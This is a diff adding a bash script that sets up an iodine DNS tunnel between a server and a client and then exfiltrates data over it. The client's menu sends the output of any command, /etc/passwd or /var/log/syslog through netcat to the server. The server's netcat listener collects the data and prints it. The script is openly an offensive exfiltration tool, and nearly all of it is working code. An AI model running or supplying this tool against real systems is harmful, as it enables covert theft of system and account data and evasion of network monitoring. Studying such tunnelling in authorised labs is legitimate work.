@@ -1,0 +1,134 @@
+#!/bin/bash
+
+# Function to display usage instructions
+usage() {
+    echo -e "Usage: $0"
+    echo -e "You will be prompted to enter the following parameters interactively:"
+    echo -e "<server|client> <server_ip> <domain_name> <password> <port>"
+    exit 1
+}
+
+# Function to install iodine if not already installed
+install_iodine() {
+    if ! command -v iodine &> /dev/null; then
+        echo -e "\nIodine is not installed. Installing iodine...\n"
+        sudo apt-get update && sudo apt-get install -y iodine
+    else
+        echo -e "\nIodine is already installed.\n"
+    fi
+}
+
+# Function to get user input for parameters
+get_user_input() {
+    read -p "Enter the role (server or client): " ROLE
+    read -p "Enter the server IP: " SERVER_IP
+    read -p "Enter the domain name: " DOMAIN_NAME
+    read -p "Enter the password: " PASSWORD
+    read -p "Enter the port: " PORT
+}
+
+# Prompt user for input parameters
+get_user_input
+
+# Install iodine
+install_iodine
+
+if [ "$ROLE" == "server" ]; then
+    # Start iodine server in the background
+    echo -e "\nStarting iodine server...\n"
+    sudo iodined -f -c -P $PASSWORD $SERVER_IP $DOMAIN_NAME &
+    IODINE_PID=$!
+
+    # Wait for iodined to initialize
+    sleep 3
+
+    # Prompt user for the file name to save received data
+    echo
+    read -p "Enter the file name to save received data: " RECEIVED_FILE
+    RECEIVED_FILE=${RECEIVED_FILE:-received_data.txt}
+
+    # Set up netcat listener to receive data
+    echo -e "\nSetting up netcat listener on port $PORT...\n"
+    nc -l -p $PORT > $RECEIVED_FILE &
+
+    # Wait for data transfer to complete
+    echo -e "\nWaiting for data transfer...\n"
+    wait $!
+
+    # Display the method and command used, and the received data
+    METHOD_USED=$(head -n 1 $RECEIVED_FILE)
+    echo -e "\nMethod used by client to exfiltrate data: $METHOD_USED\n"
+    echo -e "\nData received and saved in $RECEIVED_FILE located in $(pwd)\n"
+    tail -n +2 $RECEIVED_FILE
+
+    # Kill iodine process
+    echo -e "\nStopping iodine server...\n"
+    sudo kill $IODINE_PID
+
+elif [ "$ROLE" == "client" ]; then
+    while true; do
+        # Start iodine client
+        echo -e "\nStarting iodine client...\n"
+        sudo iodine -f -P $PASSWORD -T A $SERVER_IP $DOMAIN_NAME &
+        IODINE_PID=$!
+
+        # Wait for iodine client to connect
+        sleep 3
+
+        while true; do
+            # Prompt user to select exfiltration method
+            echo -e "\nSelect data exfiltration method:\n"
+            echo "1. Exfiltrate the output of a command"
+            echo "2. Exfiltrate the /etc/passwd file"
+            echo "3. Exfiltrate system logs"
+            echo "4. Exit (Ctrl+C)"
+            read -p "Enter the method number (1-4): " METHOD
+
+            case $METHOD in
+                1)
+                    read -p "Enter the command to execute and transfer its output (e.g., ls -la /path/to/directory): " COMMAND
+                    if $COMMAND &> /dev/null; then
+                        echo -e "\nExfiltrating output of command: $COMMAND...\n"
+                        (echo "Method: Exfiltrate output of command: $COMMAND" && $COMMAND) | nc $SERVER_IP $PORT
+                        break 2
+                    else
+                        echo -e "\nCommand execution failed. Please check the command and try again.\n"
+                    fi
+                    ;;
+                2)
+                    echo -e "\nExfiltrating the /etc/passwd file...\n"
+                    (echo "Method: Exfiltrate the /etc/passwd file" && cat /etc/passwd) | nc $SERVER_IP $PORT
+                    break 2
+                    ;;
+                3)
+                    echo -e "\nExfiltrating system logs...\n"
+                    (echo "Method: Exfiltrate system logs" && cat /var/log/syslog) | nc $SERVER_IP $PORT
+                    break 2
+                    ;;
+                4)
+                    echo -e "\nExiting...\n"
+                    sudo kill $IODINE_PID
+                    exit 0
+                    ;;
+                *)
+                    echo -e "\nInvalid method selected. Please try again.\n"
+                    ;;
+            esac
+
+            echo -e "\nPress Ctrl+C to stop the iodine client if you do not want to continue.\n"
+        done
+
+        # Give the user an option to exit or retry
+        read -p "Press Enter to retry the method selection or Ctrl+C to stop the iodine client..." -s
+        echo -e "\nRetrying method selection...\n"
+    done
+
+    # Kill iodine process
+    echo -e "\nStopping iodine client...\n"
+    sudo kill $IODINE_PID
+else
+    usage
+fi
+
+# Exit the script
+exit 0
